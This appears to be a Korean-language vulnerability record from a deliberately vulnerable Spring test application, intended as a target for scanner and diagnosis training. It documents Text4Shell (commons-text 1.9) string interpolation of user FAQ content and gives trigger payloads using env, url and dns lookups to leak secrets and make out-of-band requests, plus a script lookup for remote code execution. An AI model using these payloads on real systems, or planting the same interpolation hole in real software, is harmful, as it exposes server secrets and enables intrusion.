# VULN-021 Vulnerable dependency: commons-text 1.9 (CVE-2022-42889, "Text4Shell")

- 대상 스택: java-spring
- 심각도: Critical
- 분류: A06:2021 Vulnerable and Outdated Components (+ A03 via string interpolation)

## 위치

- `apps/java-spring/pom.xml` — `org.apache.commons:commons-text:1.9` 를 명시적으로 pin (Spring Boot BOM 관리 대상 아님 → 버전 skew 위험 없이 격리, VULN-012 문서의 `jackson-databind` 논리와 동일).
- `apps/java-spring/.../vuln/TemplateRenderer.java` — `StringSubstitutor.createInterpolator().replace(text)` 호출을 이 클래스 하나에 격리(SpEL/역직렬화 격리와 같은 취지).
- `FaqController.list()` / `NoticeController.list()` — 목록 응답을 만들 때 각 `answer` / `body` 를 `TemplateRenderer.render()` 로 통과("공지 병합 필드" 기능).

`commons-text` 1.9 의 `createInterpolator()` 는 `script`, `url`, `dns`, `env`, `file` 등 위험한 lookup 을 기본 포함한다.

## 트리거 방법

로그인한 아무 사용자:

```
POST /api/java/faqs
{"question":"환불 문의", "answer":"secret=${env:TOSS_SECRET_KEY}"}
```

이후 `GET /api/java/faqs` 렌더 시 `answer` 에 실제 `TOSS_SECRET_KEY` 값이 삽입되어 반환.

- `${url:UTF-8:http://<collab>/}` → 서버가 목록 렌더 시 해당 URL 로 요청(SSRF/OOB).
- `${dns:address|<host>}` → DNS OOB.
- `${script:javascript:...}` → JSR-223 스크립트 엔진이 classpath 에 있으면 RCE (현재 베이스 이미지는 Java 21 · Nashorn 미포함이라 별도 엔진 추가 시에만).

## 영향

- 인증된 일반 사용자가 저장 콘텐츠에 lookup 표현식을 심어 서버 측 비밀(`env`), 파일(`file`), 내부망 요청(`url`) 유발 — FAQ/공지 목록을 보는 모든 사용자 요청에서 실행.

## 증거 (재현 확인)

(진단 단계에서 채움) `${env:TOSS_SECRET_KEY}` 를 담은 FAQ 등록 후 `GET /api/java/faqs` 응답에 실제 시크릿 노출.

## 조치 상태: 미조치 (의도된 취약점)

정상 조치: `commons-text` ≥ 1.10 으로 업그레이드(+ 애초에 사용자 콘텐츠를 `StringSubstitutor` 로 보간하지 않음). SCA 스캐너(탐지 단계)의 대상 아티팩트.
